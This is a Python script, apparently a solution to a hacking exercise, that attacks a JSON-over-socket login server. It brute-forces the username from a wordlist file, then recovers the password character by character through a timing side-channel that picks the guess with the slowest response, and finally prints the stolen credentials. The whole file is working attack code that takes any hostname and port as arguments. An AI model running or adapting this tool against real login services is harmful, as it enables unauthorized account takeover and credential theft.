import sys
import socket
import json
import string
from datetime import datetime


class BruteForce:

    def __init__(self, hostname, port):
        self.hostname = hostname
        self.port = int(port)
        self.init_time = datetime.now()
        self.username = ""
        self.password = ""
        self.end = False

    def receive(self, sock, message):
        sock.send(json.dumps(message).encode())
        start = datetime.now()
        response = json.loads(sock.recv(1024).decode())
        response = response.get("result")
        finish = datetime.now()
        difference = (finish - start).microseconds
        if response == "Connection success!":
            self.end = True
        return difference

    def guess_character(self, sock, username, password):
        response_time = 0
        slowest_letter = ""
        for letter in string.ascii_letters + string.digits:
            message = {"login": username, "password": password + letter}
            new_response_time = self.receive(sock, message)
            if new_response_time > response_time:
                response_time = new_response_time
                slowest_letter = letter
                if self.end:
                    break
        return slowest_letter, response_time

    def guess_username(self, sock):
        response_time = 0
        slowest_username = ""
        username_list = [x[:-1] for x in open("logins.txt")]
        for username in username_list:
            _, new_response_time = self.guess_character(sock, username, "")
            if new_response_time > response_time:
                response_time = new_response_time
                slowest_username = username
        return slowest_username

    def guess_password(self, sock):
        password = ""
        while not self.end:
            letter, time = self.guess_character(sock, self.username, password)
            password += letter
        return password

    def main(self):
        with socket.socket() as socket_client:
            socket_client.connect((self.hostname, self.port))
            self.username = self.guess_username(socket_client)
            self.password = self.guess_password(socket_client)

            print(json.dumps({"login": self.username, "password": self.password}))


if __name__ == "__main__":
    hack = BruteForce(sys.argv[1], sys.argv[2])
    hack.main()
